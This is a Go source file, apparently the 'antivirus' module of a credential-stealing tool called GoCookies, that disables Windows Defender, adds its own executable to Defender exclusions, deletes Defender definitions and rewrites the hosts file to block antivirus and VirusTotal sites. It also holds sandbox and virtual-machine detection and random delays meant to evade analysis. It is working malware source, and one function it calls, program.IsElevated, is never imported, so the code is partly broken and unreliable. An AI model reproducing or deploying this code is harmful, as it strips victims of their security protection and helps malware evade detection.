package antivirus

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"math/rand"
	"GoCookies/utils"
)

// Run performs the antivirus modifications.
func Run() {
	sites := []string{
		"virustotal.com",
		"avast.com",
		"totalav.com",
		"scanguard.com",
		"totaladblock.com",
		"pcprotect.com",
		"mcafee.com",
		"bitdefender.com",
		"us.norton.com",
		"avg.com",
		"malwarebytes.com",
		"pandasecurity.com",
		"avira.com",
		"norton.com",
		"eset.com",
		"zillya.com",
		"kaspersky.com",
		"usa.kaspersky.com",
		"sophos.com",
		"home.sophos.com",
		"adaware.com",
		"bullguard.com",
		"clamav.net",
		"drweb.com",
		"emsisoft.com",
		"f-secure.com",
		"zonealarm.com",
		"trendmicro.com",
		"ccleaner.com",
	}

	// ---------- ONLY ADMIN ACCESS ---------
	// if !program.IsElevated() {
	// 	fmt.Println("This program must be run as administrator.")
	// 	return
	// }

	// if !program.IsElevated() {
    //     fmt.Println("Running without administrator privileges.")
    //     // Skip actions that require elevated privileges
    //     // Only perform actions that do not need elevation
    //     if err := randomDelay(); err != nil {
    //         fmt.Println("Failed to introduce delay:", err)
    //     }
    //     if err := BlockSites(sites); err != nil {
    //         fmt.Println("Failed to block sites:", err)
    //     }
    //     return
    // }

	if !program.IsElevated() {
        fmt.Println("Running without administrator privileges.")
        // Skip actions that require elevated privileges
        // Only perform actions that do not need elevation
        if err := randomDelay(); err != nil {
            fmt.Println("Failed to introduce delay:", err)
        }
        if err := BlockSites(sites); err != nil {
            fmt.Println("Failed to block sites:", err)
        }
        return
    }

	// Delayed execution to avoid detection
	if err := randomDelay(); err != nil {
		fmt.Println("Failed to introduce delay:", err)
	}

	if err := ExcludeFromDefender(); err != nil {
		fmt.Println("Failed to exclude from Defender:", err)
	}

	if err := DisableDefender(); err != nil {
		fmt.Println("Failed to disable Defender:", err)
	}

	if err := BlockSites(sites); err != nil {
		fmt.Println("Failed to block sites:", err)
	}
}

// ExcludeFromDefender adds the current executable to Defender exclusions.
func ExcludeFromDefender() error {
	if !program.IsElevated() {
		return errors.New("not elevated")
	}

	path, err := os.Executable()
	if err != nil {
		return err
	}

	cmd := exec.Command("powershell", "-Command", "Add-MpPreference", "-ExclusionPath", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

// DisableDefender modifies Defender settings to reduce functionality.
func DisableDefender() error {
	if !program.IsElevated() {
		return errors.New("not elevated")
	}

	cmd := exec.Command("powershell", "Set-MpPreference", "-DisableIntrusionPreventionSystem", "$true", "-DisableIOAVProtection", "$true", "-DisableRealtimeMonitoring", "$true", "-DisableScriptScanning", "$true", "-EnableControlledFolderAccess", "Disabled", "-EnableNetworkProtection", "AuditMode", "-Force", "-MAPSReporting", "Disabled", "-SubmitSamplesConsent", "NeverSend")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	_, err := cmd.Output()
	if err != nil {
		return err
	}

	// Remove Definitions
	cmd = exec.Command("cmd", "/c", fmt.Sprintf("%s\\Windows Defender\\MpCmdRun.exe", os.Getenv("ProgramFiles")), "-RemoveDefinitions", "-All")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	return cmd.Run()
}

// BlockSites blocks a list of websites by modifying the hosts file.
func BlockSites(sites []string) error {
	if !program.IsElevated() {
		return errors.New("not elevated")
	}

	hostFilePath := filepath.Join(os.Getenv("systemroot"), "System32\\drivers\\etc\\hosts")

	data, err := os.ReadFile(hostFilePath)
	if err != nil {
		return err
	}

	var newData []string
	for _, line := range strings.Split(string(data), "\n") {
		include := true
		for _, bannedSite := range sites {
			if strings.Contains(line, bannedSite) {
				include = false
				break
			}
		}
		if include {
			newData = append(newData, line)
		}
	}

	for _, bannedSite := range sites {
		newData = append(newData, "0.0.0.0 "+bannedSite)
		newData = append(newData, "0.0.0.0 www."+bannedSite)
	}

	d := strings.Join(newData, "\n")
	d = strings.ReplaceAll(d, "\n\n", "\n")

	cmd := exec.Command("attrib", "-r", hostFilePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err = cmd.Run(); err != nil {
		return err
	}
	if err = os.WriteFile(hostFilePath, []byte(d), 0644); err != nil {
		return err
	}

	cmd = exec.Command("attrib", "+r", hostFilePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	return cmd.Run()
}

// randomDelay introduces a random delay to simulate normal execution behavior
func randomDelay() error {
	// Random delay between 5 to 30 seconds
	delayTime := rand.Intn(26) + 5
	time.Sleep(time.Duration(delayTime) * time.Second)
	return nil
}


// CheckVMDetection detects whether the program is running in a virtual machine (common in sandboxes).
func CheckVMDetection() error {
	// Check for known virtual machine drivers (e.g., VMware, VirtualBox, Hyper-V, etc.)
	possibleVMDrivers := []string{
		"vmmouse.sys", "VBoxMouse.sys", "vboxvideo.sys", "vmhgfs.sys", // VMware & VirtualBox
		"vmci.sys", "vmswitch.sys", "vmmemctl.sys", "vmusb.sys",        // VMware specific
		"hvnt.sys", "hvsocket.sys", "hyperv.sys", "vmguest.sys",        // Hyper-V drivers
		"qemu.sys", "qemu-ga.sys", // QEMU (another VM)
	}

	// Check for the presence of these drivers in the System32\drivers directory
	for _, driver := range possibleVMDrivers {
		if _, err := os.Stat(fmt.Sprintf(`C:\Windows\System32\drivers\%s`, driver)); err == nil {
			return fmt.Errorf("VM detected due to presence of driver: %s", driver)
		}
	}

	// Check for VMware and VirtualBox registry keys
	vmwareKeys := []string{
		"HKLM\\SOFTWARE\\VMware, Inc.\\VMware Workstation",
		"HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools",
		"HKLM\\SOFTWARE\\WOW6432Node\\VMware, Inc.\\VMware Workstation",
	}
	virtualBoxKeys := []string{
		"HKLM\\SOFTWARE\\Oracle\\VirtualBox",
		"HKLM\\SOFTWARE\\WOW6432Node\\Oracle\\VirtualBox",
	}

	// Check registry for VMware or VirtualBox entries
	for _, regKey := range vmwareKeys {
		if err := checkRegistryKey(regKey); err == nil {
			return fmt.Errorf("VM detected due to VMware registry key: %s", regKey)
		}
	}

	for _, regKey := range virtualBoxKeys {
		if err := checkRegistryKey(regKey); err == nil {
			return fmt.Errorf("VM detected due to VirtualBox registry key: %s", regKey)
		}
	}

	// Check for running processes specific to virtual machines or sandboxes
	knownVMProcesses := []string{"vmware-vmx.exe", "VBoxService.exe", "vboxheadless.exe", "qemu.exe", "hyperv.dll"}
	for _, process := range knownVMProcesses {
		if isProcessRunning(process) {
			return fmt.Errorf("VM detected due to running process: %s", process)
		}
	}

	// Check if CPU or memory configuration suggests a virtual machine (limited resources)
	if err := checkSystemResources(); err != nil {
		return err
	}

	// Other heuristic checks can go here
	return nil
}

// checkRegistryKey checks if a registry key exists on the system.
func checkRegistryKey(key string) error {
	_, err := exec.Command("reg", "query", key).Output()
	if err != nil {
		return err
	}
	return nil
}

// isProcessRunning checks if a process is currently running in the system.
func isProcessRunning(processName string) bool {
	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", processName))
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(output), processName)
}

// checkSystemResources checks for abnormal CPU or memory configurations common in VMs.
func checkSystemResources() error {
	// For example, if CPU count is low or total memory is unusually low, it could indicate a VM
	cmd := exec.Command("wmic", "computersystem", "get", "numberoflogicalprocessors")
	output, err := cmd.Output()
	if err != nil {
		return fmt.Errorf("failed to check CPU count: %v", err)
	}
	if strings.Contains(string(output), "1") { // Check if the system has only 1 CPU (common in VMs)
		return fmt.Errorf("VM detected due to limited CPU (1 core detected)")
	}

	cmd = exec.Command("wmic", "computersystem", "get", "totalphysicalmemory")
	output, err = cmd.Output()
	if err != nil {
		return fmt.Errorf("failed to check system memory: %v", err)
	}
	if strings.Contains(string(output), "1 GB") { // Check if total physical memory is 1GB or less
		return fmt.Errorf("VM detected due to low memory (<= 1GB detected)")
	}

	return nil
}

// AntiSandbox functions to check if we are running in a sandbox or VM.
func AntiSandbox() error {
	// Check for abnormal system information typical of sandboxes or VMs
	if err := CheckVMDetection(); err != nil {
		return err
	}

	// Additional sandbox checks: Look for files, processes, or behavior that may suggest sandboxing
	if err := checkForSandboxTools(); err != nil {
		return err
	}

	return nil
}

// checkForSandboxTools checks for tools or processes commonly used in sandboxing environments.
func checkForSandboxTools() error {
	// Check for files or processes related to popular sandboxes like Cuckoo Sandbox, etc.
	// Common sandbox tools or behavior detection
	sandboxTools := []string{"cuckoo.exe", "sandboxie.exe", "detect_sandbox.exe"}

	for _, tool := range sandboxTools {
		if isProcessRunning(tool) {
			return fmt.Errorf("Sandbox detected due to process: %s", tool)
		}
	}

	// Check for typical sandbox file patterns or locked files
	sandboxFiles := []string{
		"C:\\Windows\\System32\\sandboxed.exe",  // Example sandboxed tool path
		"C:\\Users\\Public\\Sandbox\\",         // Common sandbox directories
	}

	for _, file := range sandboxFiles {
		if _, err := os.Stat(file); err == nil {
			return fmt.Errorf("Sandbox detected due to file presence: %s", file)
		}
	}

	// You can extend this further with behavioral checks, e.g., rapid execution time, high CPU usage in short bursts.
	return nil
}
